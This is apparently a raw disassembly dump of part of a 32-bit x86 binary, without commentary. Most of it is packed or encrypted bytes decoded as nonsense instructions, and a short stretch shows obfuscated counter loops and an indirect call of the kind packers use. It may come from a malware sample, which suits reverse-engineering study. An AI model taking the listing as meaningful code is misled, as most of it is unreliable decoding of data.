  4111d7:	sub    eax,0xdce1f15
  4111dc:	push   ebp
  4111dd:	in     eax,0xb0
  4111df:	fwait
  4111e0:	and    DWORD PTR [ebx+0xa07cbc3],eax
  4111e6:	mov    eax,0x60b9f51f
  4111eb:	xchg   esp,eax
  4111ec:	(bad)  
  4111ed:	out    0xc0,al
  4111ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111f0:	nop
  4111f1:	inc    BYTE PTR [eax+eax*8+0x4e]
  4111f5:	inc    edx
  4111f6:	repz rcr BYTE PTR [ebx+0x58],1
  4111fa:	faddp  st(3),st
  4111fc:	cmp    eax,0xc886eddb
  411201:	sar    bl,1
  411203:	inc    edx
  411204:	mov    ds:0xb8b375ab,al
  411209:	clc    
  41120a:	ins    BYTE PTR es:[edi],dx
  41120b:	sub    BYTE PTR [ecx-0x24],dh
  41120e:	xchg   ebx,eax
  41120f:	cdq    
  411210:	sub    esi,DWORD PTR [ecx+0x73294be]
  411216:	iret   
  411217:	(bad)  
  411218:	jmp    0x52ede38a
  41121d:	call   0xba7b:0xbb2f39e0
  411224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411225:	repnz fcmovb st,st(2)
  411228:	in     eax,dx
  411229:	sbb    eax,0xabb5b2ff
  41122e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41122f:	outs   dx,WORD PTR ds:[esi]
  411231:	(bad)  [eax+0x4d0e8cc9]
  411237:	or     bl,cl
  411239:	sar    BYTE PTR [ecx-0x17975957],0xa7
  411240:	loopne 0x4111e4
  411242:	fsubr  QWORD PTR ss:[edx+0xa]
  411246:	push   cs
  411247:	(bad)  
  411248:	aaa    
  411249:	sub    DWORD PTR [ebp+0x77],eax
  41124c:	add    eax,0xfb5101a9
  411251:	mov    al,ds:0xf53df55b
  411256:	and    bh,BYTE PTR [ecx]
  411258:	dec    eax
  411259:	fidivr DWORD PTR [edx]
  41125b:	cdq    
  41125c:	and    ecx,DWORD PTR [eax]
  41125e:	sbb    al,0xd9
  411260:	(bad)  
  411261:	dec    ebp
  411262:	xchg   ebp,eax
  411263:	xchg   edi,eax
  411264:	and    cl,bl
  411266:	jecxz  0x411297
  411268:	dec    ebx
  411269:	add    dl,ah
  41126b:	push   0xa36b2a2e
  411270:	inc    edi
  411271:	add    ah,BYTE PTR ds:0xf41fff15
  411277:	test   eax,0x3a1f7def
  41127c:	mov    dl,0xf0
  41127e:	sub    ebx,DWORD PTR [eax]
  411280:	jecxz  0x4112a1
  411282:	mov    dh,0x1b
  411284:	sti    
  411285:	fstp   DWORD PTR [edx+edi*1+0x7e415b97]
  41128c:	sbb    bh,BYTE PTR [eax+0x69]
  41128f:	pop    ecx
  411290:	bound  esi,QWORD PTR [edx-0x6a]
  411293:	jmp    0xb2f1:0x2906d5fb
  41129a:	cmp    DWORD PTR [esi+0x11],0x747d3b34
  4112a1:	pushf  
  4112a2:	xor    DWORD PTR [ebp+ebx*2+0x22],edi
  4112a6:	push   ss
  4112a7:	adc    ch,dl
  4112a9:	dec    edi
  4112aa:	or     BYTE PTR [ecx+0x6bfb68e9],al
  4112b0:	sub    ecx,DWORD PTR [eax]
  4112b2:	loope  0x411255
  4112b4:	xor    esi,DWORD PTR [ebp-0x4c]
  4112b7:	hlt    
  4112b8:	push   ebp
  4112b9:	lds    ebp,FWORD PTR [ecx]
  4112bb:	and    al,0x57
  4112bd:	inc    esp
  4112be:	add    ch,ch
  4112c0:	mov    edx,0x999e095d
  4112c5:	mov    esi,esp
  4112c7:	xor    bh,bh
  4112c9:	inc    eax
  4112ca:	push   0x22860076
  4112cf:	dec    edx
  4112d0:	out    dx,al
  4112d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112d2:	and    ah,dh
  4112d4:	or     al,0xe7
  4112d6:	inc    edi
  4112d7:	sbb    BYTE PTR [eax+0x1094e558],ch
  4112dd:	fist   DWORD PTR [edi-0x2b]
  4112e0:	in     al,0x4e
  4112e2:	jbe    0x41132a
  4112e4:	pop    esi
  4112e5:	sbb    esp,edx
  4112e7:	lock jns 0x41131b
  4112ea:	mov    edx,0xd17afdd9
  4112ef:	pop    esp
  4112f0:	mov    cl,0xd1
  4112f2:	push   ecx
  4112f3:	dec    edi
  4112f4:	xor    al,0xf6
  4112f6:	or     eax,0xb0211dae
  4112fb:	inc    ebx
  4112fd:	and    DWORD PTR [edi-0x6a],ebx
  411300:	lahf   
  411301:	push   eax
  411302:	in     al,dx
  411303:	mov    esp,0xb6d2dcf6
  411308:	mov    ecx,0xb4b13a2c
  41130d:	popa   
  41130e:	jl     0x4112ab
  411310:	test   DWORD PTR [edx-0x4cc290],ebp
  411316:	data16 gs into 
  411319:	and    bl,BYTE PTR [ebx+eiz*4]
  41131c:	stos   DWORD PTR es:[edi],eax
  41131d:	ins    BYTE PTR es:[edi],dx
  41131e:	cdq    
  41131f:	add    DWORD PTR [ebp+0x4bfac27c],edx
  411325:	pushf  
  411326:	shr    DWORD PTR [edx-0x11d55c81],1
  41132c:	out    0x2,eax
  41132e:	cli    
  41132f:	xor    DWORD PTR [ebx],edx
  411331:	into   
  411332:	mov    al,ds:0xa4101942
  411337:	cmc    
  411338:	push   eax
  411339:	ja     0x411313
  41133b:	cmp    DWORD PTR [edi+0x53],0xb4318e93
  411342:	xor    edx,DWORD PTR [edx+edx*8]
  411345:	mov    cl,0x41
  411347:	sub    dl,BYTE PTR [eax-0xf]
  41134a:	mov    dl,0x36
  41134c:	cli    
  41134d:	xor    BYTE PTR ds:0xf31720d9,bl
  411353:	inc    ebp
  411354:	mov    ah,0x8e
  411356:	adc    bl,bl
  411358:	mov    DWORD PTR [esi-0x4c],0x8e4dcc0c
  41135f:	jmp    0x4112e6
  411361:	loopne 0x4112e8
  411363:	cdq    
  411364:	push   ebp
  411365:	shl    BYTE PTR ds:[edi-0x47],cl
  411369:	in     eax,0x9e
  41136b:	jmp    0x411364
  41136d:	sub    BYTE PTR [ecx-0xc],dl
  411370:	pop    esi
  411371:	sbb    eax,0xd358f12e
  411376:	mov    dl,0x45
  411378:	dec    edx
  411379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41137a:	add    BYTE PTR [ebp-0x7c653f8c],bh
  411380:	sub    ch,BYTE PTR [edi+0x67]
  411383:	nop    edi
  411386:	lds    esi,FWORD PTR [ecx-0x7ae33f94]
  41138c:	jns    0x4113a8
  41138e:	pop    eax
  41138f:	(bad)  
  411390:	mov    ds,ebx
  411392:	(bad)  
  411393:	js     0x4113a0
  411395:	cld    
  411396:	push   ebp
  411397:	xchg   ecx,eax
  411398:	adc    ebx,0x1c
  41139b:	jmp    0x4113d2
  41139d:	cmp    BYTE PTR [esi+0x1869414d],ch
  4113a3:	mov    BYTE PTR [esi+ebp*4-0x3782c390],ah
  4113aa:	int3   
  4113ab:	test   al,0x9f
  4113ad:	mov    ebx,?
  4113af:	nop
  4113b0:	cmp    ch,dh
  4113b2:	mov    ah,BYTE PTR [ebx+esi*1+0x17]
  4113b6:	stos   BYTE PTR es:[edi],al
  4113b7:	mov    WORD PTR [ebp+0x115e0006],cs
  4113bd:	in     al,0xef
  4113bf:	push   0x4d40c742
  4113c4:	cmp    eax,esi
  4113c6:	mov    DWORD PTR ds:0x42fd71,0x78e4
  4113d0:	je     0x411c9a
  4113d6:	mov    eax,ds:0x41b224
  4113db:	and    DWORD PTR ds:0x42fdfa,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fdfa
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fdfa,esi
  4113f2:	cmp    DWORD PTR ds:0x42fdfa,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e267
  411404:	push   0x42e2ed
  411409:	call   DWORD PTR ds:0x42e5e7
  41140f:	cmp    DWORD PTR ds:0x42fdfa,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fdfa
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fdfa,esi
  411429:	cmp    DWORD PTR ds:0x42fdfa,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	adc    BYTE PTR [ecx-0x40],al
  41144a:	fisttp DWORD PTR [esi]
  41144c:	dec    edx
  41144d:	jo     0x4114bf
  41144f:	pop    eax
  411450:	jge    0x4114c2
  411452:	jo     0x4114b4
  411454:	fcomp  DWORD PTR [ebp-0x1a]
  411457:	xchg   DWORD PTR [ecx-0xc],ebx
  41145a:	or     BYTE PTR [edx+esi*2-0x9],dh
  41145e:	cmp    eax,0x6afb42e5
  411463:	jp     0x411427
  411465:	aad    0xa3
  411467:	mov    BYTE PTR [eax],ah
  411469:	xor    DWORD PTR [eax+ecx*8-0x22],ebp
  41146d:	das    
  41146e:	lock scas eax,DWORD PTR es:[edi]
  411470:	iret   
  411471:	lea    eax,[ecx-0x65]
  411474:	or     dl,BYTE PTR [esp+edx*8-0x1e5fc5ee]
  41147b:	mov    al,ds:0x9c56fdb6
  411480:	sbb    DWORD PTR [ecx],ecx
  411482:	add    DWORD PTR [esi-0x3c],esp
  411485:	mov    ah,0x1e
  411487:	pop    ebp
  411488:	arpl   dx,bp
  41148a:	sub    esp,DWORD PTR [ecx]
  41148c:	mov    WORD PTR ds:0x319b95c,fs
  411492:	mov    cl,BYTE PTR ds:0x81b1e7f8
  411498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411499:	das    
  41149a:	out    0x4b,eax
  41149c:	out    dx,eax
  41149d:	repz mov ah,0x3a
  4114a0:	mov    al,ds:0x933a54df
  4114a5:	(bad)  
  4114a6:	pop    edi
  4114a7:	scas   eax,DWORD PTR es:[edi]
  4114a8:	xchg   ebp,eax
  4114a9:	mov    edi,0x8aae37bd
  4114ae:	scas   eax,DWORD PTR es:[edi]
  4114af:	sahf   
  4114b0:	stos   DWORD PTR es:[edi],eax
  4114b1:	imul   DWORD PTR [edi+0x19]
  4114b4:	sub    esp,esi
  4114b6:	sub    dl,ch
  4114b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114b9:	adc    eax,0xfc5f955e
  4114be:	int3   
  4114bf:	inc    esp
  4114c0:	(bad)  
  4114c1:	mov    eax,0x55050f9e
  4114c6:	push   edi
  4114c7:	(bad)  
  4114c8:	and    al,0x78
  4114ca:	jg     0x411504
  4114cc:	mov    dl,BYTE PTR [ecx+eiz*1+0x7f]
  4114d0:	dec    ebp
  4114d1:	stc    
  4114d2:	push   ss
  4114d3:	repz retf 0x2bee
  4114d7:	xchg   edx,eax
  4114d8:	jle    0x411490
  4114da:	dec    esi
  4114db:	and    al,0xd6
  4114dd:	int    0x48
  4114df:	popf   
  4114e0:	test   al,0x8
  4114e2:	sbb    DWORD PTR [eax-0x4a19dce9],eax
  4114e8:	stos   BYTE PTR es:[edi],al
  4114e9:	aas    
  4114ea:	pop    es
  4114eb:	sbb    BYTE PTR [ebx],dl
  4114ed:	icebp  
  4114ee:	push   cs
  4114ef:	jmp    0xe21c:0x146f58b5
  4114f6:	pop    eax
  4114f7:	jne    0x41149a
  4114f9:	ret    0x8a16
  4114fc:	inc    esi
  4114fd:	outs   dx,DWORD PTR ds:[esi]
  4114fe:	inc    esi
  4114ff:	cs scas al,BYTE PTR es:[edi]
  411501:	popa   
  411502:	mov    cl,0xc7
  411504:	xor    dh,ah
  411506:	fldcw  WORD PTR [edi-0x51f7aca5]
  41150c:	pop    edi
  41150d:	scas   al,BYTE PTR es:[edi]
  41150e:	gs (bad) 
  411510:	mov    al,ds:0x728a9be1
  411515:	xchg   ebp,eax
  411516:	xlat   BYTE PTR ds:[ebx]
  411517:	mov    al,ds:0x667edd16
  41151c:	aaa    
  41151d:	xchg   BYTE PTR [edx-0x8],dl
  411520:	or     cl,BYTE PTR [eax]
  411522:	mov    ah,0x7f
  411524:	and    bh,BYTE PTR [edx]
  411526:	xchg   ecx,eax
  411527:	repnz scas eax,DWORD PTR es:[edi]
  411529:	popa   
  41152a:	xor    eax,0x1d582463
  41152f:	add    ah,dh
  411531:	mov    ebp,0xa9592e2a
  411536:	sbb    BYTE PTR [esp+edx*8-0x1e],cl
  41153a:	xchg   ebx,eax
  41153b:	pop    esi
  41153c:	sti    
  41153d:	loopne 0x411598
  41153f:	lahf   
  411540:	cmp    dl,BYTE PTR [ecx]
  411542:	xchg   ebp,eax
  411543:	mov    edi,0x5250140
  411548:	hlt    
  411549:	stos   DWORD PTR es:[edi],eax
  41154a:	push   es
  41154b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41154c:	cmp    DWORD PTR [edx+0x70],0x35
  411550:	retf   0x63a7
  411553:	into   
  411554:	leave  
  411555:	dec    esi
  411556:	sbb    al,0x54
  411558:	in     eax,0x88
  41155a:	jle    0x411554
  41155c:	dec    edi
  41155d:	pop    esi
  41155e:	ins    BYTE PTR es:[edi],dx
  41155f:	sub    DWORD PTR [edx-0x2e4114fd],edi
  411565:	mov    ebp,0x320218d8
  41156a:	es add eax,0xa633b626
  411570:	cmp    ch,BYTE PTR [esi]
  411572:	sub    DWORD PTR [esi+0x7a],ebx
  411575:	(bad)  
  411576:	je     0x411513
  411578:	adc    BYTE PTR [edi+esi*4+0x32],dl
  41157c:	pop    ebx
  41157d:	push   ds
  41157e:	aad    0xb4
  411580:	add    eax,0xa310f615
  411585:	aam    0xf7
  411587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411588:	cmp    esi,edx
  41158a:	enter  0xd28,0xb7
  41158e:	gs mov bl,0x2e
  411591:	stos   DWORD PTR es:[edi],eax
  411592:	stos   DWORD PTR es:[edi],eax
  411593:	es mov dl,0x11
  411596:	jmp    0x6ad9:0xbd2aedc0
  41159d:	mov    ch,0x91
  41159f:	cmp    eax,0x969a07ba
  4115a4:	les    esp,FWORD PTR [esi+0x78]
  4115a7:	jmp    0x411587
  4115a9:	xor    bh,BYTE PTR [edx+0x27]
  4115ac:	sub    dl,BYTE PTR [ecx+0x15]
  4115af:	and    edx,esp
  4115b1:	inc    ecx
  4115b2:	dec    eax
  4115b3:	jns    0x41158b
  4115b5:	sub    al,0x45
  4115b7:	inc    esi
  4115b8:	test   BYTE PTR [ebp+0x3a],cl
  4115bb:	hlt    
  4115bc:	sar    DWORD PTR [ebx],cl
  4115be:	push   edi
  4115bf:	jns    0x41160c
  4115c1:	xor    BYTE PTR [edi+edx*1],bl
  4115c4:	push   esp
  4115c5:	adc    al,0x31
  4115c7:	mov    al,0x1f
  4115c9:	outs   dx,BYTE PTR ds:[esi]
  4115ca:	popa   
  4115cb:	imul   edx,DWORD PTR [ecx+0x70],0x34
  4115cf:	mov    bl,0x19
  4115d1:	aad    0xca
  4115d3:	(bad)  
  4115d4:	xchg   DWORD PTR [edi+0x688d8ca4],ebx
  4115da:	push   esi
  4115db:	jmp    0x411574
  4115dd:	movd   ebp,mm2
  4115e0:	pop    esi
  4115e1:	dec    eax
  4115e2:	add    BYTE PTR [esi],ah
  4115e4:	(bad)  
  4115e5:	xchg   esi,eax
  4115e6:	lahf   
  4115e7:	jecxz  0x4115c7
  4115e9:	test   al,0x3d
  4115eb:	pop    ebp
  4115ec:	in     eax,dx
  4115ed:	sub    eax,0xdbda5c70
  4115f2:	call   0x8c425a84
  4115f7:	push   esp
  4115f8:	inc    esp
  4115f9:	pop    ds
  4115fa:	aam    0x46
  4115fc:	in     eax,0xb4
  4115fe:	into   
  4115ff:	and    BYTE PTR [eax+0x77],bh
  411602:	scas   eax,DWORD PTR es:[edi]
  411603:	je     0x41160b
  411605:	pop    edx
  411606:	out    0xa1,eax
  411608:	xor    esi,0x70355b8
  41160e:	xchg   DWORD PTR [ebx+0x54866095],ebp
  411614:	mov    edi,0x8c84ef78
  411619:	jns    0x411608
  41161b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41161c:	mov    esp,0x8424ec0e
  411621:	add    al,0x58
  411623:	sar    DWORD PTR [ebx],0xdf
  411626:	sti    
  411627:	sbb    al,0xa5
  411629:	push   0xffffff80
  41162b:	loop   0x41161f
  41162d:	loopne 0x4115f9
  41162f:	out    dx,eax
  411630:	out    dx,eax
  411631:	pop    esi
  411632:	enter  0xd37f,0xc0
  411636:	inc    esi
  411637:	mov    esi,0x76856d29
  41163c:	mov    dl,0xde
  41163e:	xor    ch,0x28
  411641:	inc    esi
  411642:	or     eax,0xab029b86
  411647:	adc    BYTE PTR [ebp-0x29d0ccb9],0xcb
  41164e:	or     bl,ch
  411650:	retf   
  411651:	(bad)  
  411653:	stc    
  411654:	mov    dl,0xa
  411656:	ins    DWORD PTR es:[edi],dx
  411657:	out    0xa,eax
  411659:	call   0xcbc4:0x6dce8325
  411660:	shr    BYTE PTR [ecx+0x1f],1
  411663:	and    DWORD PTR [esi+0x6d9e14a0],esp
  411669:	lahf   
  41166a:	daa    
  41166b:	cli    
  41166c:	and    DWORD PTR ds:0xdd75d4c9,esp
  411672:	(bad)
  411676:	cmp    BYTE PTR [eax],dl
  411678:	xor    dl,BYTE PTR ss:[edi+0x7fd526ac]
  41167f:	fsub   QWORD PTR [ebx]
  411681:	outs   dx,DWORD PTR ds:[esi]
  411682:	ja     0x41163a
  411684:	jge    0x4116b3
  411686:	les    eax,FWORD PTR [ebx+0x6820c7e8]
  41168c:	jp     0x411695
  41168e:	jg     0x411639
  411690:	xor    DWORD PTR gs:[esp+edi*2],0x57781576
  411698:	xchg   esi,eax
  411699:	xor    edi,DWORD PTR [ebx-0x1b5844f4]
  41169f:	push   eax
  4116a0:	and    dh,BYTE PTR [edx*4+0x112dc30e]
  4116a7:	fcomp  QWORD PTR [ecx]
  4116a9:	pop    ecx
  4116aa:	pop    esi
  4116ab:	lock ret 
  4116ad:	imul   edx,DWORD PTR ds:0x8e4b6e7,0x1c311b61
  4116b7:	inc    edx
  4116b8:	stos   DWORD PTR es:[edi],eax
  4116b9:	aad    0x91
  4116bb:	lea    ebx,ds:0x6012c406
  4116c1:	jnp    0x4116af
  4116c3:	(bad)  
  4116c4:	fsub   st(0),st
  4116c6:	and    ecx,DWORD PTR [esi]
  4116c8:	adc    bl,bl
  4116ca:	dec    edi
  4116cb:	inc    eax
  4116cc:	call   0x4d0e:0xb62b2939
  4116d3:	sub    eax,0xbfab1c1c
  4116d8:	bound  esp,QWORD PTR [eax-0xa]
  4116db:	sbb    al,0xa6
  4116dd:	aaa    
  4116de:	in     eax,dx
  4116df:	stc    
  4116e0:	in     al,dx
  4116e1:	mov    DWORD PTR [ecx],edi
  4116e3:	sub    eax,0x5d1df428
  4116e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116e9:	retf   
  4116ea:	sahf   
  4116eb:	imul   esp,DWORD PTR [eax-0x2731ee8b],0x68
  4116f2:	xor    ch,BYTE PTR [edx]
  4116f4:	scas   al,BYTE PTR es:[edi]
  4116f5:	shr    al,cl
  4116f7:	sub    cl,0x6b
  4116fa:	xchg   BYTE PTR [eax],ch
  4116fc:	div    DWORD PTR [eax-0x4b28e12d]
  411702:	pop    ss
  411703:	inc    ebp
  411704:	lods   al,BYTE PTR ds:[esi]
  411705:	adc    eax,0x8e0e5ebc
  41170a:	pushf  
  41170b:	rcr    eax,1
  41170d:	inc    ebx
  41170e:	xor    al,0x4c
  411710:	loopne 0x41178e
  411712:	pusha  
  411713:	(bad)  
  411714:	cld    
  411715:	(bad)  
  411716:	out    dx,al
  411717:	int    0x86
  411719:	push   ecx
  41171a:	into   
  41171b:	jno    0x4116fa
  41171d:	sub    bl,bl
  41171f:	es (bad) 
  411721:	mov    ds:0x7b29d9a6,eax
  411726:	pop    ebx
  411727:	push   edi
  411728:	ficomp DWORD PTR [ebx-0x3b]
  41172b:	fdivr  QWORD PTR [ebx+0x1d10c135]
  411731:	jae    0x41172e
  411733:	shr    DWORD PTR [ecx+0x58cbbd19],1
  411739:	shl    BYTE PTR [esi-0x7e30e9bd],cl
  41173f:	jnp    0x411775
  411741:	jnp    0x411726
  411743:	xor    ebx,ebx
  411745:	xchg   esp,eax
  411746:	add    BYTE PTR [edi-0x72],ch
  411749:	mov    ch,0x9f
  41174b:	cmp    al,0x9b
  41174d:	and    al,0x6
  41174f:	mov    ebp,0xb5260ce3
  411754:	jg     0x411760
  411756:	sbb    BYTE PTR [eax],bl
  411758:	and    al,0xac
  41175a:	fst    DWORD PTR [esi]
  41175c:	and    bl,dh
  41175e:	inc    edi
  41175f:	xchg   BYTE PTR [ecx+0x17],dh
  411762:	cmp    DWORD PTR [edi+0x4d],ecx
  411765:	iret   
  411766:	in     al,0x62
  411768:	js     0x411710
  41176a:	jb     0x411710
  41176c:	pop    ss
  41176d:	add    BYTE PTR ds:0x562c8f64,dh
  411773:	ins    DWORD PTR es:[edi],dx
  411774:	pop    ebx
  411775:	cmc    
  411776:	outs   dx,BYTE PTR ds:[esi]
  411777:	lods   eax,DWORD PTR ds:[esi]
  411778:	sbb    eax,0xcbf4f4eb
  41177d:	mov    ch,0x83
  41177f:	ja     0x41172f
  411781:	(bad)  
  411782:	push   0x69
  411784:	mov    BYTE PTR [ebp+0x8],cl
  411787:	inc    ebp
  411788:	shr    dl,0x8c
  41178b:	sahf   
  41178c:	jmp    0x4117c4
  41178e:	mov    dl,0xd9
  411790:	repnz cs scas al,BYTE PTR es:[edi]
  411793:	dec    esi
  411794:	xchg   ebp,eax
  411795:	xchg   esp,eax
  411796:	mov    DWORD PTR [edx+0x60f0244f],ebx
  41179c:	ins    BYTE PTR es:[edi],dx
  41179d:	scas   al,BYTE PTR es:[edi]
  41179e:	sub    dh,BYTE PTR [eax]
  4117a0:	lods   al,BYTE PTR ds:[esi]
  4117a1:	mov    eax,0xe50f36f7
  4117a6:	and    BYTE PTR [esi+ecx*4-0x46a4a8a7],cl
  4117ad:	push   0xdcfd9a0b
  4117b2:	xor    ebp,ebx
  4117b4:	push   ss
  4117b5:	push   esp
  4117b6:	push   eax
  4117b7:	sub    eax,0xd9dd9330
  4117bc:	adc    ebx,DWORD PTR [edx-0x5f]
  4117bf:	pop    eax
  4117c0:	or     edx,0x3
  4117c3:	(bad)  
  4117c4:	(bad)  [ebx]
  4117c6:	lock fiadd WORD PTR [ebx]
  4117c9:	aaa    
  4117ca:	mov    eax,0xc0b09060
  4117cf:	add    ebp,ecx
  4117d1:	scas   eax,DWORD PTR es:[edi]
  4117d2:	adc    eax,0xcb68fd5c
  4117d7:	fist   WORD PTR [ebx+0x48]
  4117da:	dec    ebx
  4117db:	es je  0x4117ff
  4117de:	inc    edx
  4117df:	push   ebx
  4117e0:	mov    bl,al
  4117e2:	sbb    al,0xc5
  4117e4:	imul   esp,DWORD PTR [ecx-0x7f903f],0x2a0ae6d9
  4117ee:	daa    
  4117ef:	sub    edx,eax
  4117f1:	jge    0x41177b
  4117f3:	outs   dx,BYTE PTR ds:[esi]
  4117f4:	mov    ds:0xe954560f,al
  4117f9:	xchg   esi,eax
  4117fa:	xor    BYTE PTR [edx],ah
  4117fc:	les    edx,FWORD PTR [eax-0x43672a0a]
  411802:	std    
  411803:	gs push ecx
  411805:	popf   
  411806:	aad    0x81
  411808:	xchg   ebx,eax
  411809:	iret   
  41180a:	cmc    
  41180b:	test   DWORD PTR [edx+esi*1-0x21e82d9d],edx
  411812:	cmp    bh,BYTE PTR [ebp+edi*1+0x66ae24cc]
  411819:	xlat   BYTE PTR ds:[ebx]
  41181a:	loope  0x411872
  41181c:	enter  0x7a83,0x6b
  411820:	pop    edi
  411821:	ret    
  411822:	jmp    0x4117a6
  411824:	jle    0x41184d
  411826:	scas   eax,DWORD PTR es:[edi]
  411827:	aas    
  411828:	mov    al,0xf1
  41182a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41182b:	call   0xad45d0cb
  411830:	cmp    edx,DWORD PTR [ebx+0x11420cce]
  411836:	push   ebp
  411837:	add    edi,edx
  411839:	push   esi
  41183a:	xchg   esi,eax
  41183b:	mov    esi,DWORD PTR [ebp+0xc]
  41183e:	sub    eax,edx
  411840:	add    DWORD PTR ds:0x42fd75,0x7f3f
  41184a:	xor    eax,ecx
  41184c:	mov    DWORD PTR ds:0x42fdfa,0x5771
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fdf6,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx-0x19f83f17],dl
  41187c:	sub    al,0x76
  41187e:	push   edi
  41187f:	jo     0x4118f1
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x4118f8
  411886:	fdivp  st(6),st
  411888:	mov    ecx,0x55021665
  41188d:	fdiv   DWORD PTR [ebx-0x539c5db7]
  411893:	inc    esp
  411894:	xor    ah,BYTE PTR ds:0x7dcee551
  41189a:	jnp    0x411840
  41189c:	scas   eax,DWORD PTR es:[edi]
  41189d:	adc    eax,DWORD PTR [ebp-0x71]
  4118a0:	ins    DWORD PTR es:[edi],dx
  4118a1:	outs   dx,BYTE PTR ds:[esi]
  4118a2:	add    dl,BYTE PTR [edx-0xd]
  4118a5:	mov    ah,0x61
  4118a7:	mov    dh,0xf2
  4118a9:	push   ss
  4118aa:	sub    DWORD PTR [esp+ecx*2+0x4d6407c8],edx
  4118b1:	push   esp
  4118b2:	mov    eax,0x40812873
  4118b7:	sub    BYTE PTR [esi],dl
  4118b9:	imul   edx,eax,0xa3de12ce
  4118bf:	xchg   esp,eax
  4118c0:	out    0xc6,al
  4118c2:	dec    ecx
  4118c3:	inc    ebp
  4118c4:	push   ecx
  4118c5:	scas   al,BYTE PTR es:[edi]
  4118c6:	sahf   
  4118c7:	aam    0xb3
  4118c9:	test   eax,0x93f14ed5
  4118ce:	rol    BYTE PTR [ecx-0x5],1
  4118d1:	icebp  
  4118d2:	jbe    0x411929
  4118d4:	adc    dl,al
  4118d6:	loop   0x4118e1
  4118d8:	sub    ebp,DWORD PTR [ecx+0x3a7cdfb7]
  4118de:	(bad)  [edi]
  4118e0:	rol    ch,0x65
  4118e3:	mov    WORD PTR [ecx],gs
  4118e5:	outs   dx,DWORD PTR ds:[esi]
  4118e6:	jle    0x4118cf
  4118e8:	sub    DWORD PTR [esi+0x52],ecx
  4118eb:	mov    bh,0x1b
  4118ed:	mov    cl,0x21
  4118ef:	add    ebx,DWORD PTR [esi-0x4be11869]
  4118f5:	sbb    al,0x6c
  4118f7:	cmp    ch,BYTE PTR [edi]
  4118f9:	push   es
  4118fa:	jg     0x41195c
  4118fc:	ret    0x943c
  4118ff:	xchg   edx,eax
  411900:	out    0x10,al
  411902:	out    0xc1,al
  411904:	cmp    al,0xb9
  411906:	fcomp  QWORD PTR [ebx+esi*8]
  411909:	add    DWORD PTR [esi+0x72815d1c],0x463550a4
  411913:	pop    ds
  411914:	adc    cl,BYTE PTR [ecx+0x4c]
  411917:	out    dx,al
  411918:	pop    ds
  411919:	push   0xffffffa0
  41191b:	arpl   WORD PTR [edx+0x45],di
  41191e:	jns    0x411961
  411920:	dec    ecx
  411921:	sub    eax,0x8a243a87
  411926:	mov    DWORD PTR [eax+0x6bb766a6],0x385c2049
  411930:	mov    ebp,0xea282e32
  411935:	add    edi,eax
  411937:	jl     0x41193a
  411939:	lods   eax,DWORD PTR ds:[esi]
  41193a:	fisub  DWORD PTR [edx+esi*2]
  41193d:	int3   
  41193e:	push   cs
  41193f:	dec    esi
  411940:	and    eax,0x9b91792
  411945:	clc    
  411946:	push   ds
  411947:	push   eax
  411948:	fcomp  QWORD PTR [edi+esi*4]
  41194b:	stos   BYTE PTR es:[edi],al
  41194c:	cmp    al,0x17
  41194e:	push   edi
  41194f:	and    edx,esp
  411951:	pop    ebp
  411952:	jno    0x411901
  411954:	xchg   edx,eax
  411955:	and    eax,0x1c7b6ed3
  41195a:	ja     0x4119da
  41195c:	mov    esi,DWORD PTR [ecx]
  41195e:	cdq    
  41195f:	ss out dx,al
  411961:	sub    BYTE PTR [esp+edi*1+0x99a11f3],0x1a
  411969:	sahf   
  41196a:	rol    BYTE PTR [esi+0x1426ede5],0xfd
  411971:	adc    BYTE PTR [ecx],bl
  411973:	retf   0x217
  411976:	test   al,0x1f
  411978:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411979:	lods   al,BYTE PTR ds:[esi]
  41197a:	mov    edx,0xca5f8852
  41197f:	fs aam 0x3a
  411982:	fisubr DWORD PTR [ecx+0x4890d007]
  411988:	lods   eax,DWORD PTR ds:[esi]
  411989:	jge    0x411940
  41198b:	not    al
  41198d:	xchg   ecx,eax
  41198e:	sbb    eax,0xd0296fb2
  411993:	je     0x411a0b
  411995:	jmp    0x8155:0xa1590574
  41199c:	pop    edi
  41199d:	das    
  41199e:	jle    0x4119da
  4119a0:	loop   0x411947
  4119a2:	mov    DWORD PTR [esi+0x48],ebx
  4119a5:	adc    DWORD PTR [edi-0x4d],esp
  4119a8:	sub    eax,0x92ca8570
  4119ad:	dec    esi
  4119ae:	or     eax,0xdeef948c
  4119b3:	mov    edi,0xa15cffc
  4119b8:	inc    ecx
  4119b9:	dec    ecx
  4119ba:	or     eax,0x6582ba94
  4119bf:	adc    ch,ah
  4119c1:	dec    esi
  4119c2:	popf   
  4119c3:	out    dx,al
  4119c4:	into   
  4119c5:	std    
  4119c6:	or     al,0xc3
  4119c8:	adc    eax,0xee0e37f9
  4119cd:	fst    QWORD PTR [esi]
  4119cf:	sbb    eax,0xa408116d
  4119d4:	in     eax,dx
